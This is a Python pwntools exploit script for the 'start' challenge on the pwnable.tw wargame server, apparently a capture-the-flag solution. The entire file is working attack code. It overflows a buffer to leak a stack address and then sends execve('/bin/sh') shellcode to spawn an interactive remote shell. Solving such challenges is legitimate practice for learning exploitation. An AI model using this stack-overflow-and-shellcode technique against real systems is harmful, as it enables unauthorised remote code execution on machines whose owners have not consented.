# pwnable-start-exploit.py
# by Aidan Wech (NashuaRodgers)
# nc chall.pwnable.tw 10000

from pwn import *

def main():
    # connection variables
    host = "chall.pwnable.tw"
    port = 10000

    # variables
    offset = 20
    pop_ecx = 0x08048087
    shellcode = asm("""
                    xor eax, eax
                    add eax, 0xb
                    xor ecx, ecx
                    xor edx, edx
                    xor esi, esi
                    push 0x0068732f
                    push 0x6e69622f
                    mov ebx, esp
                    int 0x80
                    push 0x0804809d
                    ret
    """)
    payload1 = flat({
        offset: pop_ecx
    })

    # connect to remote process
    p = remote(host, port)

    # send first payload
    p.read(timeout=3)
    p.send(payload1)

    # retrieve leaked stack addr, create payload with shellcode
    stackaddr = unpack(p.read(timeout=3)[:4])
    payload2 = flat({
        offset: p32(stackaddr + 20)}, shellcode
    )

    # send payload
    p.send(payload2)
    p.interactive()
    

if __name__ == "__main__":
    main()